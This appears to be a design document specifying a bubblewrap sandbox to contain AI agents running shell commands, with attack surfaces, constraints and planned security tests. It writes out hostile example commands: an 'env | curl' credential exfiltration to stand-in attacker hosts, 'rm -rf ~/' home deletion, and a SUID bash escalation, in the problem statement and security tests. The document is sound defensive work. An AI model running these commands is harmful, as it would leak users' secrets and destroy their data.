<!-- (c) 2026-* Frederick Bloom -- 20260816-182145-UncontainedAgentExecution.driv-0.0.1.md -- Hanaden AI Loader -->
---
filename-id:   20260816-182145-UncontainedAgentExecution.driv-0.0.1
node-type:     T-DRIV
layer:         1
domain:        TECHNICAL
role:          DRIVER
version:       0.0.1
status:        Active
author:        Frederick Bloom
copyright:     "(c) 2026-* Frederick Bloom"
description: >
  Technical Driver: AI agents executing shell commands on an unguarded host
  environment operate with the full privilege, filesystem access, environment
  state, and network reach of the host user account. This structural absence
  of isolation creates a persistent, non-negotiable deficit: any single
  hallucinated or malicious command can destroy data, exfiltrate credentials,
  corrupt system state, or trigger cascading infrastructure failures.
  The deficit exists independently of any proposed solution.
parent:        20260816-182145-BwrapEnhanced2026.strat-0.0.1
tdd:
  test-file:   "src/test/hanaden-bwrap-enhanced/BwrapEnhanced2026.strat/UncontainedAgentExecution.driv/test_uncontained_agent_execution_driv.sh"
---

# UncontainedAgentExecution: AI Agent Isolation Deficit — Technical Driver

## Problem Statement

AI agents that call shell commands are, by construction, executing as the
host user. Without an isolation boundary, the agent's execution context is
identical to an interactive terminal session for that user. Any command the
agent emits — whether correct, hallucinated, or injected — runs with the
full authority of that account.

This creates a **structural deficit**: the absence of a containment boundary
is not a configuration error that can be patched; it is the default operating
mode of every agentic pipeline that runs commands without explicit sandboxing.

The deficit manifests across four orthogonal attack surfaces simultaneously:

1. **Filesystem write authority** — the agent can write, overwrite, or delete
   any file owned by the user, including project source, git history, SSH keys,
   and application configuration. A single hallucinated `rm -rf ~/` destroys
   irreversibly.

2. **Credential inheritance** — the agent inherits the host shell environment,
   which typically contains API tokens, database passwords, cloud credentials,
   and SSH agent sockets. A single `env | curl -d @- attacker.com` silently
   exfiltrates the entire credential surface.

3. **Network unrestriction** — the agent has the same network reach as the
   host, including access to internal services, localhost ports, and outbound
   internet. Data exfiltration and C2 callback are both trivially achievable.

4. **Autofs mount storm exposure** — on systems with remote-backed `/homes`
   directories (NFS, autofs), any filesystem operation that touches
   `/homes/<user>` for a non-local user triggers a remote mount attempt.
   This causes 30-second hangs per non-existent user enumerated, cascading
   into denial-of-service conditions across shared infrastructure.

These are not theoretical risks. They are realized in unguarded agentic
pipelines daily. The deficit exists the moment an agent is given a shell;
it does not require a specific exploit or adversarial intent.

## Technical Impact

| Impact Dimension | Current State (Uncontained) | Target State (Contained) | Delta |
|:---|:---|:---|:---|
| **Data destruction risk** | Any write command executes on real host files | All writes confined to ephemeral sandbox VFS | Catastrophic → Zero |
| **Credential exfiltration surface** | Full host `env` inherited (API keys, DB passwords, SSH sockets) | `--clearenv` strips all; only explicit allowlist passed | Complete exposure → Zero exposure |
| **Network exfiltration reach** | Full host network reachable from agent process | `--unshare-net` isolates namespace by default | Unrestricted → Denied by default |
| **Autofs mount storm blast radius** | Any `ls /homes/<user>` triggers 30s hang × N enumerated paths | `/homes` replaced by tmpfs overlay at sandbox entry | N × 30s hangs → Zero network mounts |
| **Privilege escalation path** | Agent runs as host UID with full host capabilities | User namespace maps UID; capabilities dropped | Host UID privilege → Unprivileged sandbox UID |
| **Reproducibility deficit** | Host state leaks into agent command outputs | Deterministic VFS constructed from spec at each run | Host-dependent → Fully reproducible |

## Constraints

- The solution must not require root privileges to construct the sandbox.
  Development environments are workstation-class; `sudo` is not a valid dependency.
- The solution must not modify the kernel, install kernel modules, or alter
  system-level security policies (`/etc/security`, `AppArmor`, `SELinux`).
- The solution must preserve the agent's ability to read the project workspace
  and execute development toolchains (mise, bwrap, bash) within the sandbox.
- The solution must not introduce a performance overhead exceeding 200ms
  sandbox construction time for interactive agent workflows.
- Network isolation must be opt-in restorable (`--share-net` flag) to allow
  legitimate network-dependent agent tasks.

## Test Suite

> **Suite ID:** UncontainedAgentExecution.driv-SUITE
> **Suite name:** Uncontained Agent Execution — Deficit Verification Suite
> **Test file:** `src/test/hanaden-bwrap-enhanced/BwrapEnhanced2026.strat/UncontainedAgentExecution.driv/test_uncontained_agent_execution_driv.sh`
> **Integration test boundary:** Verifies that the paired Motivation (NamespaceIsolatedSandbox.moti) genuinely closes each attack surface identified in this Driver.
> **Unit test boundary:** Each attack surface sub-clause (filesystem write, credential inheritance, network reach, autofs storm) is independently verifiable.

### ⚙️ Functional Tests

| ID | Description | Method | Pass Criteria | TDD |
|:---|:---|:---|:---|:---|
| UAE-F01 | Sandbox write is isolated from host filesystem | Touch a file at a path inside sandbox; verify host path unchanged post-exit | `diff` host path before/after sandbox run returns empty | NOT_STARTED |
| UAE-F02 | Host credentials are not inherited by default | Run `env` inside sandbox without explicit `--setenv`; grep for host API key pattern | API key pattern absent from sandbox `env` output | NOT_STARTED |
| UAE-F03 | Network is isolated by default | Attempt `curl` to known-reachable host endpoint from inside default sandbox | `curl` exits with network unreachable error | NOT_STARTED |
| UAE-F04 | `/homes` does not trigger remote autofs mounts | List sandbox `/homes` directory with 10+ host users present | Command returns instantly (< 1s); zero autofs mount events recorded in host `/proc/mounts` delta | NOT_STARTED |

### 🛡️ Security Tests

| ID | Description | Attack / Scenario | Expected Defense | TDD |
|:---|:---|:---|:---|:---|
| UAE-S01 | Credential exfiltration via env pipe | `env \| curl -d @- attacker.test` executed inside sandbox | Outbound connection refused (net unshared); env contains no host secrets | NOT_STARTED |
| UAE-S02 | Host file destruction via rm | `rm -rf ~/` executed inside sandbox user home path | Host `~/` unchanged; sandbox tmpfs destroyed cleanly on exit | NOT_STARTED |
| UAE-S03 | Privilege escalation via SUID binary | Copy `/bin/bash`, `chmod u+s`, execute as root | `whoami` inside sandbox returns non-root UID; nosuid enforced | NOT_STARTED |
| UAE-S04 | Autofs mount storm via path enumeration | Loop `ls /homes/<a..z>` inside sandbox | Zero autofs events triggered; tmpfs serves all paths instantly | NOT_STARTED |

## References

- [`20260816-182145-BwrapEnhanced2026.strat-0.0.1`](../20260816-182145-BwrapEnhanced2026.strat-0.0.1.md)
- [`20260826-140524-63d102-7728-b8b3-88ee17f824fb-DriverVsMotivator-analysis.analys-1.1.0.md`](../../../../generic-sdlc-and-engine-readonly/20260826-140524-63d102-7728-b8b3-88ee17f824fb-DriverVsMotivator-analysis.analys-1.1.0.md)

## Changelog

| Version | Date | Author | Changes |
|:---|:---|:---|:---|
| 0.0.1 | 2026-08-16 | Frederick Bloom + AI | Initial stub |
| 0.0.1 | 2026-08-17 | Frederick Bloom + AI | Enriched: Rationale and root cause Mermaid |
| 0.0.2 | 2026-08-27 | Frederick Bloom + AI | Full rewrite: correct T-DRIV schema (domain, role, parent, tdd), Problem Statement expanded to 4 attack surfaces with evidence, quantified Impact Table, Constraints, Test Suite with functional and security tests |
